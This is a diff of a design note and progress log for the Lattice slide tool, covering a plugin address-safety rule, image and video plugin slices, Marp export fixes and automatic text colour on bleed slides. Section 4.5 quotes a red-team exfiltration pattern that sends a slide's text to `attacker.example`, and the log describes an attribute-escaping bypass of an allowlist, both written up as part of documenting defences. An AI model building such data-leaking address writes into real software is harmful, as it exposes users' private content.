@@ -217,13 +217,17 @@ simplifies the plugin contract before user plugins ship (its D4, phases P2 and P
 
 ### 4.5 The address comes only from the author's block (added 2026-10-16, after #2725)
 
-**The attack.** A red team recorded it on 2026-10-12 (`lib/transformers/rebuilt-classes.js:4-11`), and
-PR #2725 (`claude/plugin-inline-door-followups`) is closing it out: the built-in `video`, `qr` variant,
+**The rule now lives in `spec/LPM.md` §10 ("The address rule, on every channel")** and is held by
+`checkSlideTextAddressReaders` (landed 2026-11-09, branch `claude/slide-text-address-gate`; progress below). This
+section keeps the attack and the per-plugin consequences; the spec is the contract.
+
+**The attack.** A red team recorded it on 2026-10-12 (in the header of `lib/transformers/rebuilt-classes.js`, deleted
+2026-11-09), and PR #2725's follow-ups named the fixes: the built-in `video`, `qr` variant,
 `contact` and `wifi` passes read a slide's text and turn any address they find into something the
 viewer loads or scans (a poster link, a QR code). A zip plugin's output also lands on the slide as text. So a
 plugin with no network of its own can write `https://attacker.example/?d=<the slide's text>` onto a video
-slide, and Lattice's own pass publishes it. Today `lib/transformers/rebuilt-classes.js` stops this by
-refusing to let a data plugin's fence draw on those slides (its consumer is `lib/packages/code-door.js`). The owner wants plugins to draw everywhere, which is safe
+slide, and Lattice's own pass publishes it. Until 2026-11-09 `lib/transformers/rebuilt-classes.js` stopped this by
+refusing to let a data plugin's fence draw on those slides. It is deleted: every reader now masks plugin output. The owner wants plugins to draw everywhere, which is safe
 only if no code turns slide text into an address. These plugins are where that becomes true, so they follow
 #2725's five rules:
 
@@ -243,9 +247,8 @@ only if no code turns slide text into an address. These plugins are where that b
    tokens in the engine, before any plugin draws. `lint:deck --fix` offers the `@video{…}` record in its
    place, the same migration as the Marp keywords (§8, decision 2).
 5. **The old pass is deleted in the commit that replaces it**: its registry entry, its DOM half, and its row
-   on #2725's `SANCTIONED_SLIDE_TEXT_ADDRESS_READERS` (that check and its allowlist are pending in #2725 and
-   were not yet on its branch at `98a69d6`; if they land renamed, follow the landed names). The shadow list in `rebuilt-classes.js` is derived from
-   the registry, so it shrinks on its own. These plugins never go on that allowlist: if
+   on `SANCTIONED_SLIDE_TEXT_ADDRESS_READERS` (`tools/check-ownership.js`). There is no shadow list left to shrink
+   (`rebuilt-classes.js` is deleted). These plugins never go on that allowlist: if
    `checkSlideTextAddressReaders` flags them, the code is wrong.
 
 **What this note's own design had to change.** Three places in §4 would have rebuilt the attack:
@@ -1045,3 +1048,181 @@ Slices 2 and 3 do not start until #2725's check is on `main`, because they delet
   real Chromium: the title stays text, a hostile address adds no second link, the parsed host stays on a provider, a record in running text stays
   code). The Studio attack spec also ran on WebKit and Firefox (`@crosswidth @webkit-tablet @gecko`) at 1440, 820 and 390: 9 of 9 pass. Its first
   WebKit run failed because `page.route()` interception broke the plugin sandbox's loads in WebKit; the spec no longer routes.
+- 2026-11-09: the slide-text address gate landed (branch `claude/slide-text-address-gate`, fixes 1 to 5 of #2725's
+  follow-ups). `checkSlideTextAddressReaders` holds 19 readers in `SANCTIONED_SLIDE_TEXT_ADDRESS_READERS`, each with its
+  address writes and guard calls COUNTED: 8 masked (qr-card, qr-general, video, collage, team-profile, logo-marks,
+  prose-projection, the runtime's data probe) and 11 that build no address from slide text. The adversarial trio found
+  one hole the masks cannot see: a plugin fence in a bullet whose output held a bare `<li>` was moved by the browser's
+  parser out of the plugin's root into the author's list, and the live runtime's `qr` pass encoded it. The door now
+  refuses an orphan `<li>`/`<dd>`/`<dt>` (`doorFinishFence`), and the spec names it as the rule's second leg. The readers mask `[data-lattice-plugin]` through `maskPluginSubtrees`, so
+  `rebuilt-classes.js` and the door's shadow are deleted and a plugin draws on every slide. The rule moved into
+  `spec/LPM.md` §10; §4.5 above now points there. The video row this note expected to delete never existed: `video`
+  was already masked-by-design (§4.5 rule 3) when the gate landed, and it is sanctioned with guard `masks` because
+  its QR and poster come from the stamped figure. Slice 3 (`image`) builds to the gate: it adds no row.
+- 2026-11-10: slice 3 (branch `claude/image-plugin-slice-3`, one PR, one commit per step). **Video catch-up:** `>{…}` is the
+  video record's short form (decision 3; Segno's `TAGS` and `INLINE_TAGS` gain `>`; all 458 shipped decks render
+  byte-identically, and a census test pins the `>`-leading code spans in shipped decks); video draws on any slide, its CSS split
+  into the plugin's own look and the `video` slide's layout, and `video-slide-class` is gone. **The shared layer (§4.7):**
+  `lib/core/media-display.js` (handed to plugins as `ctx.media`) and `lib/base/base.media.css`, built from the approved
+  prototype with the §4.9 fixes; tones and finishes are blend layers, not filters, so a background poster and an `<img>` share
+  one rule and a vector PDF keeps them. Hosts declare what they decide in a manifest field, `media`, which generates both the
+  parse-time table and each host guide's "Media inside" section (§7's recommendation). **The `image` plugin:** named-only,
+  `address` and `block`; an `image` slide seats a record as the same `.lattice-bg` panel `![bg](x)` made (`mirror` for the left),
+  the new `bleed` class makes it a slide's background, a collage packs it as a tile, anywhere else it is a flow figure. The
+  alias, `![title](src "description")`, still renders as an `<img>`: its alt is its title and its Markdown title its
+  description, so it carries no `data-lattice-*` stamp. **Census of the registry passes (§4.2):** none is deleted.
+  `image-adaptive` measures a picture the author named (no text-to-address path), `image-scrim` draws by class, `collage` lays
+  out tiles (a record's `<img>` carries its title as alt, so the collage needs no change), and `logo-marks` re-emits an
+  address already on the page with its plugin mask; the slide-text address gate passed with no new entry, and two entries
+  shrank (the video transform no longer writes a poster address). **Migration (decision 2, owner 2026-11-10):** `image-marp-keyword`
+  is a warning with an autofix that moves placement to the slide (`left` → `mirror`, a background → `bleed`) and names what was
+  never drawn; two shipped decks migrated by `--fix` render pixel-identically to main. The deck-wide sweep waits for the meta
+  record's codemod (step 5) on main, by the owner's order; the engine stops reading the keywords in its own PR right after
+  this one, with no compatibility period. Not built here: `subtitles`, the oEmbed title offer, the `file` row, presenting and
+  narration of clips (slices 4 and 5).
+- 2026-11-10: the trio on slice 3 (red team, inversion, checker). **Fixed in the PR:** the panel's style value is
+  attribute-escaped as well as percent-encoded, so an author's `&#39;` stays text inside `url('…')` (it decoded to a quote and
+  loaded another site past the allowlist); a block figure with no resolver draws nothing; the PDF writer kept a picture under
+  its tone and finish layers as a vector on top of them, because a `pointer-events: none` layer takes no hit test (`paintedAbove`,
+  lib/core/pdf-compose/read-slide.mjs), so a duotone and the `bleed` scrim vanished from the PDF and now do not; both Marp
+  producers rewrite records before they localize assets and lift `![bg]` (`withImageRecordsAsMarp`), and the translation follows
+  the engine's class rules and allowlist; narration speaks a panel's words; the tooltip carries only the description, so the
+  title is not read twice; a collage packs a record as a tile (a tiles host gets the bare `<img>`); an untitled clip draws no empty
+  caption row; the migration will not rewrite an address holding `&` or `\`, a description holding a backtick, an indented code
+  line or a class comment holding a second directive; `image-extra-panel` covers `bleed`. **Accepted, by look:** on shipped
+  `video` slides the poster and its chip move 1 to 2 px (the frame wrapper), and a `video companion` poster with no title now
+  centers on its lead instead of sitting 11 px high (main reserved a gap for an empty aside). **Still open in this PR, owed before
+  the merge ask:** the box known before the bytes (an image figure has no `aspect-ratio` yet), `lg` measured against the space
+  left on the slide rather than the slide, the `check:jank` record axis, the `check-ownership` gate on host CSS that reaches into
+  a figure, and `aria-describedby` for a flow figure's description.
+- 2026-11-10: the five slice-3 guards the trio found unbuilt, built in the same PR. **The box before the bytes:** the render takes
+  an optional `imageSize(url)` from its host (the CLI reads the file header, lib/core/image-dimensions.js), the image record
+  stamps `--lat-media-ar` and the `<img>`'s `width`/`height`, and the shared layer sizes the frame from the aspect; measured,
+  the figure and the paragraph under it do not move when the picture is taken away. Every other host knows it too: the engine
+  carries the size of every `sample:` picture (lib/integrations/markdown-it/sample-sizes.js, held to the files by a test), and the Studio's render
+  hook answers an `asset:` photo's size from its Library record, keyed by the name the author wrote, so the preview's `blob:` URL
+  and an export's `data:` URI agree. A web picture's size is unknown before it loads, so it sizes itself, as before. **`lg` against the space left:** with the aspect known, the height cap bounds the
+  width, and a heading, an `lg mat` picture and a paragraph fit. **The sweep:** `test/integration/invariants/media-record-sweep.test.js`
+  renders every size × frame × `show=` in a flow host with the real CLI and measures in Chromium: sizes in order, nothing off the
+  slide, the heading still, the text below clear, the box unmoved without the picture; it fails when `sm` is made larger than
+  `md`. It is a test of its own rather than an axis of `tools/check-jank.js`: the record's movement is measured directly.
+  **The reach-in gate:** `checkMediaReachIns` (tools/check-ownership.js, in `build:check`) holds component CSS that selects a
+  figure's shared-layer parts to zero, with `SANCTIONED_MEDIA_REACH_INS` (empty) failing on a stale entry. **The description for
+  a screen reader:** a flow figure's `<img>` carries it as `aria-description` when the slide does not show it.
+- 2026-11-10: venue conformance on slice 3 (CI, integration shard 4). On a `tall` canvas the `video` and `video companion` samples
+  clipped their caption at `laptop` and `huddle`, two causes of this PR's own making. The aside's cap selector grew
+  (`.video-embed > .video-aside`) and outranked the tall override that lifts it, so the caption squeezed into 13rem; the
+  override now has the same shape. And the shared frame kept a full 16:9 box at the column's width where the old poster had
+  shrunk to fit, so the stack ran 36px past the stage; the layer gains `--lat-media-give` (a host lets a clip's frame and poster
+  get shorter, the still cropping to cover) and the stacked `video` slide sets it on its figure, never reaching into the parts.
+  The full `--strict` ratchet passes with no new or stale row; the wide demo decks render pixel-identically before and after.
+- 2026-11-10: **Markdown's picture is the record's shortcut** (owner, option A, after slice 3). A lone `![title](src "description")`
+  on a slide that places a picture (`image`, `image mirror`, `bleed`; not `collage`, which already tiles Markdown pictures) is
+  rewritten at parse time into `@image{"src", title="…", description="…"}` and drawn by the record's own path
+  (lib/integrations/markdown-it/plugins.js), so the two cannot drift; the address is the one the author wrote (the `asset:`
+  rule keeps it on the token as `meta.authoredSrc`), quoted. Anywhere else it stays an ordinary picture, by measurement: 11
+  lone Markdown pictures ship in 5 decks, 8 of them inside panes that fit photos their own way. Export-to-Marp writes it as
+  `![bg]`. This is what lets the Studio's Placement control set the slide's class and keep an editable picture, and lets the
+  deck sweep write `![…](…)` rather than a record. Identity: 462 decks, one differs (`styles-device-check`, its web-image slide).
+- 2026-11-10: **the Studio stops writing `![bg]`** (first half of the engine break; the owner chose to split it so the engine
+  stops reading the keywords only after the deck sweep). Compose's Placement control (docs/src/lib/compose/image-objects.ts
+  `placeImage`) writes the slide's class in one undo step: Left `image mirror`, Right `image`, Full `content bleed`, In the
+  text `content`, every other token kept; an old `![bg …]` alt loses its keywords and takes its description as its name.
+  Offered only for a lone picture on a `content`/`image`/class-less slide, and refused for a class in a compound comment.
+  The photo finders (card-ink-pick.ts `photoAt`) read all three spellings. Studio e2e: 20/20 on Chromium desktop and
+  phone, WebKit phone and tablet, Gecko, the control checked at 1440, 820 and 390 in each.
+- 2026-11-10: a record in a deck written in Marp draws (the copy-and-go kit, and a record a bundle recipient adds). Marp has
+  no token path, and the runtime may not read an address off the page, so the record now reaches the runtime from the
+  author's Markdown: marp-cli's config engine reads it from the tokens into one data block (`video-marp-engine.js`, written
+  into the kit's and the bundle's `marp.config.cjs`), and the VS Code preview reads the saved deck file (`drawnRecords`).
+  The runtime draws a lone span only when its exact text is one of those records, outside `[data-lattice-plugin]`, no more
+  often than the Markdown holds it, and builds the figure from the record (`video-marp-dom.js`, reached through the plugin's
+  `services`); the `video` layout's composer builds the card. Paired by identity rather than line, because VS Code's
+  `data-line` follows the unsaved buffer: an edit above a video would otherwise have turned it back into code until a
+  save. Measured in VS Code 1.145.2 / Marp for VS Code 3.6.1 at *Disable*: 0 of 1,094 frames showed the raw record while
+  slide 1 was edited, against 10 with the same-microtask redraw removed. `spec/LPM.md` §10 names the channel; the
+  rule is unchanged. Pinned by test/unit/plugins/video-marp-records.test.js and test/integration/export/marp-kit-video.test.js
+  (a plugin-subtree span with an owed record goes red with the guard removed).
+- 2026-11-11: **one placed-picture rule** (branch `claude/media-engine-break-cont-3ukhz8`; followups.d/3126-p2, now deleted).
+  `lib/core/placed-picture.mjs` decides whether a lone `![title](src)` is the slide's placed photo, from a markdown-it parse, and
+  every reader asks it: the engine (`placedPictureIndex` on its own tokens), Export-to-Marp (lib/export/picture-placement.js
+  reads the deck with the engine's slide boundaries and class rules, then hands the plugin the placed lines), Compose's badge and
+  Placement control (the kernel names the placed picture by its ordinal in the serialized slide), the photo finder `photoAt` and
+  `image-extra-panel`, which now also warns on two lone pictures and no other photo (none is placed). **The parse is the
+  caller's:** the playground keeps the lint's boundary parser apart from the engine's (`assertLintParserIsolated`), so the
+  kernel imports neither, and the export's slide reading sits on the Node side because the plugin's files are reached from the
+  lint core. **Fixed drifts, each now a row of test/fixtures/placed-picture-cases.json:** the export placed an indented picture
+  in a list item; `photoAt` placed a `BG` alt, an `http:` address and a picture in a sentence; Compose missed a deck-wide `bleed`
+  under a slide class, a deck-wide `collage` (a component name the engine drops) and a `backgroundImage` directive. **Engine
+  change:** a `backgroundColor` wrote `background-image: none`, which the engine read as a photo in place; it no longer blocks
+  the shortcut (0 of 466 decks differ). The table (26 cases) runs through the engine, the export and the lint in node, and
+  through Compose and `photoAt` in vitest; each new arm fails on `main`'s readers (5 node, 9 vitest). **After the checker:** the
+  kernel judges a `backgroundImage` exactly as the engine's style sink writes it (`realDeclValueIsSafe` moved to
+  lib/core/decl-value-safe.js, shared; `none` in any case is no photo); the export writes every picture the kernel places, from
+  the parse when its old line pattern cannot read it (a title with parentheses, a setext heading above, CRLF), and carries a
+  front-matter or running `backgroundImage` into the kernel as the engine does; the Studio's photo underline reads the slide's
+  class before it blanks comments. The table is 35 cases. The Studio readers cannot see a class or a background carried from an
+  earlier slide, nor a `split: headings` boundary (they read one `---` slide): five cases skipped by name, recorded in
+  followups.d/3126-p3-studio-carried-class.md.
+- 2026-11-11: **the `image` slide lifts only its own panels** (followups.d/3126-p1, now deleted). `wrapImageText`
+  (lib/core/bg-image.js) collected every `<div class="lattice-bg…` with a regex and moved it to section level, so an author's raw
+  panel in a quote drew as the slide's photo and hid the real one (measured on a CLI PNG render: before, the quoted square photo
+  filled the panel slot and the slide's `![bg right]` never showed). **The panel is the slide's by provenance, not by position.**
+  The engine hoists a `![bg]` that sits anywhere but its own top-level paragraph (a heading, a list item, a quote, a table cell,
+  prose, a lazy continuation after a list) to its own block before the slide-level block that held it
+  (lib/engine/background-image.js `liftToPanels`). `slidePanelSpans` reads the section with the shared tag scanner
+  (`@laticent/markup` `scanTags`) and lifts a panel at section level, or the image plugin's panel (`data-lattice-media="image"`,
+  a host marker author-markup.js renames) from any depth outside a plugin's drawing, so a record alone in a quote stays the photo;
+  panels come out by position. The DOM mirror already moved only direct children, and image-adaptive now measures only the
+  section's own panel. A first cut lifted "section level or a paragraph" and lost the photo in every other shape; the checker
+  caught it with the CLI (a photo typed on the line after a list drew no photo), and each shape is now a test row. The `image`
+  layout's thirteen `.lattice-bg` rules now use the child combinator (`section.image > .lattice-bg`, no change in specificity), so
+  a panel left in a quote is not positioned as the slide's photo either. test/unit/core/image-text-nested-panels.test.js renders each shape
+  through the real engine and the DOM mirror, one test per shape; `npm run identity:check`: 466 decks, 0 differ.
+  **The Reading view, decided:** a quoted raw panel now reaches the article as the author's quoted HTML, as any quoted raw HTML
+  does on a `content` slide (on `main` too); the `image` slide used to drop it only because the lift pulled it out of the quote.
+  The guarantee that matters holds: it is never re-hosted as the article's photo, and the forged `data-lattice-media` marker
+  never survives (author-markup.js renames it). test/unit/transformers/prose-projection.test.js asserts exactly that now.
+- 2026-11-11: **Marp bundles draw full-bleed backgrounds again** (found by the owner in the #3132 sign-off PDFs: the `bleed` slide
+  was blank in every bundle, main included). Marp renders a slide with an advanced background as three sections sharing its
+  classes (`background`, `content`, `pseudo`); the bundle's runtime masthead lift (lib/transformers/masthead-lift.js) matched the
+  `background` one as a `.form` section and wrapped Marp's `section > div > figure` container in a stage cell, leaving the figure
+  0px tall. The lift now skips Marp's `background` and `pseudo` layers. A marp-cli render of the bundle draws the photo, and the
+  slide matches the engine's render of the same deck; a masthead-lift test holds the layers out (fails on the old code).
+- 2026-11-11: **a `bleed` slide picks its ink from its photo** (the owner, on the #3132 sign-off PDFs: dark words over a dark
+  photo; first logged for a separate PR, then brought into #3132 at the owner's word). One decision, lib/core/bleed-ink.mjs: the
+  slide's heading band (its top 45%, mapped onto the photo as `background-size: cover` crops it, card-ink's `coverSourceRect`) is
+  averaged in linear light and the ink that reads better on it by WCAG contrast wins (card-ink's own inks, `pickCardInk` at no
+  backing). Light ink is the theme's `dark` mode on that slide and dark ink its `light` mode, so every token follows the theme;
+  a slide whose own `_class` (`data-class`) names a mode keeps it. Three hosts read the pixels, because no single place can: the
+  runtime (lib/transformers/bleed-ink.js) in the Studio, the Playground and the fluid viewer; the CLI (lib/export/bleed-ink-stamp.js
+  from lattice.js, before the page loads, since its export page carries no runtime: the file is read through the deck's confiner
+  and drawn as a `data:` image so its pixels are readable); and Export-to-Marp (lib/export/marp-bleed-ink.js, called by both
+  producers: tools/export-marp.js samples in a child Chromium, tools/bleed-ink-sampler.cjs, and the Studio in a canvas), because
+  a bundle opened over `file://` may not read its local pictures' pixels (measured: the runtime pass works in a bundle only with
+  `--allow-file-access-from-files`, which marp-cli does not pass). image.styles.css gains the `light` bleed veil beside the `dark`
+  scrim: dark words over a mid-tone photo with a dark shape under the heading did not read without it. In a Marp bundle the
+  photo is Marp's own figure, so the scrim and veil (which sit on the engine's panel) do not apply there; the ink does. No shipped
+  deck changes (identity:check 466/0); examples/bleed-auto-ink.md is the demo, rendered light and dark for the owner.
+  The checker on the first cut found two collisions and a wrong band, fixed before merge: dark ink is written `color-light`, not
+  the bare `light` (that word is also the `divider light` subtopic variant, the collision lib/core/resolve-color-mode.js already
+  avoids), and applying an ink evicts every other color-mode token (a deck's `color-light` won on source order and put dark words
+  over the dark scrim); a `print` deck and a slide whose carried `class:` names a mode are left alone; a layout that centers its
+  words (divider, title, closing, quote, big-number) reads the middle band of the photo, not its top. The Marp rewrite
+  reads `_class` per comment (a shared line with `_paginate` kept its other directive), keeps CRLF, and builds a new spot `_class`
+  from the carried class or the deck register so `bleed` is not dropped. The Gecko Studio e2e then showed the photo itself
+  missing: the preview's CSP named the site's own origin for fonts only, and Firefox does not read a `srcdoc` frame's `'self'` as
+  the site, so every `sample:` picture drew nothing there. lib/core/subresource-csp.mjs now names it in `img-src` and `media-src`
+  too (the host's own origin only; a KaTeX mirror stays a font host).
+  The runtime pass put the docs route budget's engineJsGz 2.3KB past its ceiling. tools/build-runtime.js gives the bytes back
+  without a ceiling raise: the placed-picture rule (read only by the Marp writer and the lint) resolves to a stub in every
+  runtime build, and an `import` of a `@laticent/*` package resolves to the CommonJS copy the runtime already carries
+  (meta-door.mjs had brought in a second, ESM copy of segno's reader). The preview runtime ends 11.8KB gzipped under `main`'s.
+  A second checker, on the fixed Marp rewrite, found it still wrong on real bundles, fixed before merge. It wrote a new spot
+  `_class` above slide 1's settings block, so the block no longer folded and a re-imported bundle lost every deck setting. It
+  read deck classes from Marp's front matter only, where a bundle keeps none (its `class:` and `color-mode:` move into the
+  settings block), so a `print` bundle still took an ink. It read a `_class` or a `![bg]` inside a code fence. It turned a
+  multi-key comment's `_class` line into a value that swallowed `_paginate`, and it skipped a comment written right after
+  another. Now the rewrite reads the deck as Lattice reads a bundle (the block folded), skips code (markdown-it's fences), edits
+  only the `_class` line of a multi-key comment, inserts below the block, and applies `classesWithInk` everywhere, so the eviction
+  holds there too. `statement` left the centered list: it is a bucket, not a layout.
